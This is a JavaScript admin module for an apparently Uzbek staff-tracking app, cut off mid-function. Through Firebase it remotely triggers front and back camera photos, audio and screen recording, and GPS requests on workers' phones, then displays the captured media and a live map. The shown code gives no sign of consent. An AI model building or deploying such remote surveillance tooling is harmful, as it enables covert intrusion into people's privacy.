// IJRO Big Admin Module (Full Surveillance, Device Control, Photo/Audio/Screen/GPS)

let adminSelectedUsername = null;
let adminDeviceListeners = {};
let adminDeviceData = {
  heartbeat: 0,
  battery: null,
  isGps: true,
  lat: null,
  lon: null,
  photos: [],
  currentPhotoIdx: 0,
  audios: [],
  currentAudioIdx: 0,
  screens: [],
  currentScreenIdx: 0,
  statusMsg: '',
  isAudioRecordingActive: false
};

function initAdminView() {
  const trackable = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');
  if (!adminSelectedUsername && trackable.length > 0) {
    adminSelectedUsername = trackable[0].username;
  }
  attachAdminDeviceListeners(adminSelectedUsername);
  renderAdminView();
}

function attachAdminDeviceListeners(devId) {
  if (!devId || !window.firebaseRtdb) return;

  // Detach previous
  Object.keys(adminDeviceListeners).forEach(k => {
    try {
      if (adminDeviceListeners[k]) {
        adminDeviceListeners[k].ref.off('value', adminDeviceListeners[k].cb);
      }
    } catch (_) {}
  });
  adminDeviceListeners = {};

  const db = window.firebaseRtdb;
  const devRef = db.ref(`tracking/devices/${devId}`);

  // Heartbeat
  const hbCb = snap => {
    adminDeviceData.heartbeat = snap.val() || 0;
    updateAdminStatusHeader();
  };
  devRef.child('heartbeat').on('value', hbCb);
  adminDeviceListeners['heartbeat'] = { ref: devRef.child('heartbeat'), cb: hbCb };

  // Info (Battery)
  const infoCb = snap => {
    const val = snap.val() || {};
    adminDeviceData.battery = val.battery !== undefined ? val.battery : null;
    updateAdminStatusHeader();
  };
  devRef.child('info').on('value', infoCb);
  adminDeviceListeners['info'] = { ref: devRef.child('info'), cb: infoCb };

  // Location
  const locCb = snap => {
    const loc = snap.val() || {};
    if (loc.lat && loc.lon) {
      adminDeviceData.lat = loc.lat;
      adminDeviceData.lon = loc.lon;
      updateAdminMapLocation(loc.lat, loc.lon);
    }
  };
  devRef.child('location').on('value', locCb);
  adminDeviceListeners['location'] = { ref: devRef.child('location'), cb: locCb };

  // Archive Photos
  const photosCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && (v.back_base64 || v.front_base64)) {
        v._key = child.key;
        list.push(v);
      }
    });
    adminDeviceData.photos = list;
    if (adminDeviceData.currentPhotoIdx >= list.length) {
      adminDeviceData.currentPhotoIdx = Math.max(0, list.length - 1);
    }
    renderAdminPhotos();
  };
  devRef.child('media/archive_photos').limitToLast(20).on('value', photosCb);
  adminDeviceListeners['photos'] = { ref: devRef.child('media/archive_photos'), cb: photosCb };

  // Archive Audio
  const audioCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && v.audio_base64) {
        v._key = child.key;
        list.push(v);
      }
    });
    adminDeviceData.audios = list;
    if (adminDeviceData.currentAudioIdx >= list.length) {
      adminDeviceData.currentAudioIdx = Math.max(0, list.length - 1);
    }
    renderAdminAudio();
  };
  devRef.child('media/archive_audio').limitToLast(20).on('value', audioCb);
  adminDeviceListeners['audio'] = { ref: devRef.child('media/archive_audio'), cb: audioCb };

  // Archive Screen
  const screenCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && (v.screen_base64 || v.video_base64)) {
        v._key = child.key;
        list.push(v);
      }
    });
    adminDeviceData.screens = list;
    if (adminDeviceData.currentScreenIdx >= list.length) {
      adminDeviceData.currentScreenIdx = Math.max(0, list.length - 1);
    }
    renderAdminScreenCapture();
  };
  devRef.child('media/archive_screen').limitToLast(20).on('value', screenCb);
  adminDeviceListeners['screen'] = { ref: devRef.child('media/archive_screen'), cb: screenCb };

  // Status message toast
  const statusCb = snap => {
    const msg = snap.val();
    if (msg) {
      showToast(msg);
    }
  };
  devRef.child('media/status').on('value', statusCb);
  adminDeviceListeners['status'] = { ref: devRef.child('media/status'), cb: statusCb };

  // Command state: audio
  const audioCmdCb = snap => {
    const val = snap.val();
    const isActive = (val === true || val === 'start' || val === 'true');
    adminDeviceData.isAudioRecordingActive = isActive;
    const btn = document.getElementById('admin-voice-btn');
    if (btn) {
      btn.innerHTML = isActive 
        ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
        : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
      btn.className = isActive ? "btn btn-red" : "btn btn-yellow";
    }
  };
  devRef.child('commands/record_audio').on('value', audioCmdCb);
  adminDeviceListeners['cmd_audio'] = { ref: devRef.child('commands/record_audio'), cb: audioCmdCb };

  // Command state: screen
  const screenCmdCb = snap => {
    const val = snap.val();
    const isActive = (val === true || val === 'start' || val === 'true');
    adminDeviceData.isScreenRecordingActive = isActive;
    const btn = document.getElementById('admin-screen-btn');
    if (btn) {
      btn.innerHTML = isActive 
        ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
        : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
      btn.style.background = isActive ? "#DC2626" : "#7C3AED";
    }
  };
  devRef.child('commands/record_screen').on('value', screenCmdCb);
  adminDeviceListeners['cmd_screen'] = { ref: devRef.child('commands/record_screen'), cb: screenCmdCb };
}

function selectAdminDevice(username) {
  adminSelectedUsername = username;
  adminDeviceData.photos = [];
  adminDeviceData.audios = [];
  adminDeviceData.screens = [];
  attachAdminDeviceListeners(username);
  renderAdminView();
}

function renderAdminView() {
  resetAdminMap();
  const container = document.getElementById('admin-content');
  if (!container) return;

  const trackableUsers = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');

  container.innerHTML = `
    <!-- 1. Device Selector -->
    <div class="task-card" style="padding: 14px;">
      <div style="font-size: 12px; font-weight: 600; color: var(--text-secondary); margin-bottom: 6px;">
        Nazorat qilinayotgan xodim / qurilma:
      </div>
      <select id="admin-device-select" class="form-control" style="width: 100%; font-weight: bold; padding: 8px; border-radius: 8px; border: 1px solid #CBD5E1;" onchange="selectAdminDevice(this.value)">
        ${trackableUsers.map(u => `
          <option value="${u.username}" ${u.username === adminSelectedUsername ? 'selected' : ''}>
            ${escapeHtml(u.fullName || (u.firstName + ' ' + u.lastName))} (${u.position || u.role}) - @${u.username}
          </option>
        `).join('')}
      </select>

      <div id="admin-device-status-badge" style="display: flex; align-items: center; justify-content: space-between; margin-top: 10px; font-size: 12px;">
        <!-- Filled by updateAdminStatusHeader() -->
      </div>
    </div>

    <!-- 2. Remote Command Buttons -->
    <div class="task-card" style="padding: 14px;">
      <div style="font-size: 13px; font-weight: bold; color: var(--navy-dark); margin-bottom: 10px; display: flex; align-items: center; gap: 6px;">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>Masofaviy Boshqaruv Buyruqlari
      </div>
      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
        <button class="btn btn-primary" onclick="adminSendTakePhoto()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c1.65 0 3-1.35 3-3s-1.35-3-3-3-3 1.35-3 3 1.35 3 3 3zm0 2c-2.76 0-5 2.24-5 5v1h10v-1c0-2.76-2.24-5-5-5z"/></svg>Rasm Olish
        </button>
        <button id="admin-voice-btn" class="btn ${adminDeviceData.isAudioRecordingActive ? 'btn-red' : 'btn-yellow'}" onclick="adminToggleRecordAudio()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          ${adminDeviceData.isAudioRecordingActive 
            ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
            : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish"}
        </button>
        <button id="admin-screen-btn" class="btn ${adminDeviceData.isScreenRecordingActive ? 'btn-red' : ''}" onclick="adminToggleRecordScreen()" style="background: ${adminDeviceData.isScreenRecordingActive ? '#DC2626' : '#7C3AED'}; color: white; display: flex; align-items: center; justify-content: center; gap: 6px;">
          ${adminDeviceData.isScreenRecordingActive 
            ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
            : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis"}
        </button>
        <button class="btn btn-outline" onclick="adminSendRequestGps()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>GPS Yangilash
        </button>
      </div>
    </div>

    <!-- 3. Live Map -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 0 1 0-5 2.5 2.5 0 0 1 0 5z"/></svg>Jonli Joylashuv (Xarita)
        </div>
        <div id="admin-coords-text" style="font-size: 11px; color: var(--text-secondary);">
          ${adminDeviceData.lat ? `${adminDeviceData.lat.substring(0, 8)}, ${adminDeviceData.lon.substring(0, 8)}` : 'Aniqlanmoqda...'}
        </div>
      </div>
      <div id="admin-map-container" style="width: 100%; height: 240px; border-radius: 8px; border: 1px solid #E2E8F0; z-index: 1; background: #0F172A;"></div>
    </div>

    <!-- 4. Photos (Back & Front) -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>Masofaviy Kameralar
        </div>
        <div id="admin-photo-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-photos-container">
        <!-- Rendered by renderAdminPhotos() -->
      </div>
    </div>

    <!-- 5. Dictaphone Audio Archive -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>Yozib Olingan Ovozlar
        </div>
        <div id="admin-audio-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-audio-container">
        <!-- Rendered by renderAdminAudio() -->
      </div>
    </div>

    <!-- 6. Screen Recordings / Screenshots -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>Ekran Tasvirlari
        </div>
        <div id="admin-screen-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-screen-container">
        <!-- Rendered by renderAdminScreenCapture() -->
      </div>
    </div>
  `;

  updateAdminStatusHeader();
  renderAdminPhotos();
  renderAdminAudio();
  renderAdminScreenCapture();
  if (adminDeviceData.lat && adminDeviceData.lon) {
    updateAdminMapLocation(adminDeviceData.lat, adminDeviceData.lon);
  }
}

function updateAdminStatusHeader() {
  const badgeEl = document.getElementById('admin-device-status-badge');
  if (!badgeEl) return;

  const now = Date.now();
  const isOnline = (now - adminDeviceData.heartbeat) < 65000;
  const batteryStr = adminDeviceData.battery !== null ? `${adminDeviceData.battery}%` : '--';

  badgeEl.innerHTML = `
    <div style="display: flex; align-items: center; gap: 6px;">
      <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: ${isOnline ? '#16A34A' : '#F59E0B'};"></span>
      <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#D97706'};">${isOnline ? 'Online (Faol)' : 'Offline (Kutish rejimida)'}</span>
      ${!isOnline ? '<span style="font-size: 10px; color: var(--text-secondary); margin-left: 4px;">(Buyruqlar navbatga yoziladi)</span>' : ''}
    </div>
    <div style="color: var(--text-secondary); font-weight: 600; display: flex; align-items: center; gap: 4px;">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
      ${batteryStr}
    </div>
  `;
}

let adminLeafletMap = null;
let adminLeafletMarker = null;

function resetAdminMap() {
  if (adminLeafletMap) {
    try {
      adminLeafletMap.remove();
    } catch (_) {}
    adminLeafletMap = null;
    adminLeafletMarker = null;
  }
}

function updateAdminMapLocation(lat, lon) {
  const coordsEl = document.getElementById('admin-coords-text');
  if (coordsEl) coordsEl.innerText = `${lat.toString().substring(0, 8)}, ${lon.toString().substring(0, 8)}`;

  const latNum = parseFloat(lat);
  const lonNum = parseFloat(lon);
  if (isNaN(latNum) || isNaN(lonNum)) return;

  const mapContainer = document.getElementById('admin-map-container');
  if (!mapContainer) return;

  // Leaflet kutubxonasi yuklanganligini tekshirish
  if (typeof L === 'undefined') {
    mapContainer.innerHTML = `<div style="padding: 20px; text-align: center; color: #94A3B8; font-size: 12px;">Xarita yuklanmoqda (${latNum}, ${lonNum})...</div>`;
    return;
  }

  const webCustomPin = L.divIcon({
    className: 'web-pulse-marker',
    html: '<div style="position:relative;display:flex;align-items:center;justify-content:center;width:32px;height:32px;"><div style="position:absolute;width:36px;height:36px;border-radius:50%;background:rgba(220,38,38,0.35);"></div><svg viewBox="0 0 24 24" width="30" height="30" fill="none"><path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22C12 22 19 14.25 19 9C19 5.13 15.87 2 12 2Z" fill="#DC2626"/><circle cx="12" cy="9" r="3.5" fill="#FFFFFF"/></svg></div>',
    iconSize: [32, 32],
    iconAnchor: [16, 32],
    popupAnchor: [0, -32]
  });

  if (!adminLeafletMap) {
    try {
      adminLeafletMap = L.map('admin-map-container', {
        zoomControl: true,
        attributionControl: false
      }).setView([latNum, lonNum], 16);

      const googleLayer = L.tileLayer('https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
        maxZoom: 20,
        attribution: 'Google'
      });
      const googleHybrid = L.tileLayer('https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
        maxZoom: 20,
        attribution: 'Google Satellite'
      });
      const osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: 'OSM'
      });
      const cartoLayer = L.tileLayer('https://basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}@2x.png', {
        maxZoom: 19,
        attribution: 'CARTO'
      });

      googleLayer.addTo(adminLeafletMap);

      L.control.layers({
        "Google Standart": googleLayer,
        "Sun'iy yo'ldosh (Google)": googleHybrid,
        "OpenStreetMap": osmLayer,
        "CARTO": cartoLayer
      }).addTo(adminLeafletMap);

      adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
      adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
    } catch (e) {
      console.warn("Leaflet init error:", e);
    }
  } else {
    try {
      adminLeafletMap.setView([latNum, lonNum], 16);
      if (adminLeafletMarker) {
        adminLeafletMarker.setLatLng([latNum, lonNum]);
      } else {
        adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
        adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
      }
    } catch (e) {
      console.warn("Leaflet update error:", e);
    }
  }

  setTimeout(() => {
    if (adminLeafletMap) {
      adminLeafletMap.invalidateSize();
    }
  }, 200);
}

// Commands
let lastAdminTakePhotoTime = 0;
function adminSendTakePhoto() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const now = Date.now();
  if (now - lastAdminTakePhotoTime < 3000) {
    showToast("Iltimos, kuting... Rasm olinmoqda");
    return;
  }
  lastAdminTakePhotoTime = now;

  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(now);
  showToast(isOnline ? "Rasm olish buyrug'i yuborildi!" : "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
}

function adminToggleRecordAudio() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  const nextState = !adminDeviceData.isAudioRecordingActive;
  adminDeviceData.isAudioRecordingActive = nextState;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_audio`).set(nextState);

  const btn = document.getElementById('admin-voice-btn');
  if (btn) {
    btn.innerHTML = nextState 
      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
    btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
  }
  showToast(nextState ? (isOnline ? "Masofaviy ovoz yozish boshlandi" : "Ovoz yozish navbatga qo'yildi") : "Ovoz yozish to'xtatildi, saqlanmoqda...");
}

function adminToggleRecordScreen() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  const nextState = !adminDeviceData.isScreenRecordingActive;
  adminDeviceData.isScreenRecordingActive = nextState;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_screen`).set(nextState);

  const btn = document.getElementById('admin-screen-btn');
  if (btn) {
    btn.innerHTML = nextState 
      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
    btn.style.background = nextState ? "#DC2626" : "#7C3AED";
  }
  showToast(nextState ? (isOnline ? "Masofaviy ekran yozish boshlandi..." : "Ekran yozish navbatga qo'yildi") : "Ekran yozish to'xtatildi, saqlanmoqda...");
}

function adminSendRequestGps() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
  showToast(isOnline ? "GPS yangilash so'rovi yuborildi!" : "GPS so'rovi navbatga qo'yildi");
}

// Photos Viewer
function renderAdminPhotos() {
  const container = document.getElementById('admin-photos-container');
  const counter = document.getElementById('admin-photo-counter');
  if (!container) return;

  const photos = adminDeviceData.photos;
  if (!photos || photos.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 24px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Hozircha suratlar mavjud emas. "Rasm Olish" tugmasini bosing.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentPhotoIdx, photos.length - 1));
  adminDeviceData.currentPhotoIdx = idx;
  const cur = photos[idx];
  if (counter) counter.innerText = `${idx + 1} / ${photos.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
      <div>
        <div style="font-size: 11px; font-weight: bold; text-align: center; color: var(--text-secondary); margin-bottom: 4px;">Orqa Kamera</div>
        <div style="background: #000; border-radius: 8px; height: 160px; display: flex; align-items: center; justify-content: center; overflow: hidden;">
          ${cur.back_base64 ? `<img src="data:image/jpeg;base64,${cur.back_base64}" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="color: #64748B; font-size: 11px;">Mavjud emas</span>`}
        </div>
      </div>
      <div>
        <div style="font-size: 11px; font-weight: bold; text-align: center; color: var(--text-secondary); margin-bottom: 4px;">Oldi Kamera</div>
        <div style="background: #000; border-radius: 8px; height: 160px; display: flex; align-items: center; justify-content: center; overflow: hidden;">
          ${cur.front_base64 ? `<img src="data:image/jpeg;base64,${cur.front_base64}" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="color: #64748B; font-size: 11px;">Mavjud emas</span>`}
        </div>
      </div>
    </div>
    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
        </button>
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>
          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
        </button>
      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #16A34A; border-color: #16A34A; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadPhoto(${idx})">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Saqlash
      </button>
    </div>
  `;
}

function adminPrevPhoto() {
  if (adminDeviceData.currentPhotoIdx > 0) {
    adminDeviceData.currentPhotoIdx--;
    renderAdminPhotos();
  }
}

function adminNextPhoto() {
  if (adminDeviceData.currentPhotoIdx < adminDeviceData.photos.length - 1) {
    adminDeviceData.currentPhotoIdx++;
    renderAdminPhotos();
  }
}

// Audio Viewer
function renderAdminAudio() {
  const container = document.getElementById('admin-audio-container');
  const counter = document.getElementById('admin-audio-counter');
  if (!container) return;

  const audios = adminDeviceData.audios;
  if (!audios || audios.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 20px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Ovoz yozuvlari mavjud emas. "Ovoz Yozish" buyrug'ini bering.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentAudioIdx, audios.length - 1));
  adminDeviceData.currentAudioIdx = idx;
  const cur = audios[idx];
  if (counter) counter.innerText = `${idx + 1} / ${audios.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <audio controls src="data:audio/mp4;base64,${cur.audio_base64}" style="width: 100%; height: 38px; margin-bottom: 8px;"></audio>
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <div style="display: flex; gap: 6px;">
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
        </button>
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>
          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
        </button>
      </div>
      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #0D9488; border-color: #0D9488; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadAudio(${idx})">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
      </button>
    </div>
  `;
}

function adminPrevAudio() {
  if (adminDeviceData.currentAudioIdx > 0) {
    adminDeviceData.currentAudioIdx--;
    renderAdminAudio();
  }
}

function adminNextAudio() {
  if (adminDeviceData.currentAudioIdx < adminDeviceData.audios.length - 1) {
    adminDeviceData.currentAudioIdx++;
    renderAdminAudio();
  }
}

// Screen Viewer
function renderAdminScreenCapture() {
  const container = document.getElementById('admin-screen-container');
  const counter = document.getElementById('admin-screen-counter');
  if (!container) return;

  const screens = adminDeviceData.screens;
  if (!screens || screens.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 20px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Ekran tasvirlari mavjud emas. "Ekran Zapis" tugmasini bosing.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentScreenIdx, screens.length - 1));
  adminDeviceData.currentScreenIdx = idx;
  const cur = screens[idx];
  if (counter) counter.innerText = `${idx + 1} / ${screens.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <div style="background: #000; border-radius: 8px; max-height: 240px; display: flex; align-items: center; justify-content: center; overflow: hidden; margin-bottom: 8px;">
      ${cur.video_base64 ? `
        <video controls src="data:video/mp4;base64,${cur.video_base64}" style="max-height: 240px; width: 100%;"></video>
      ` : (cur.screen_base64 ? `
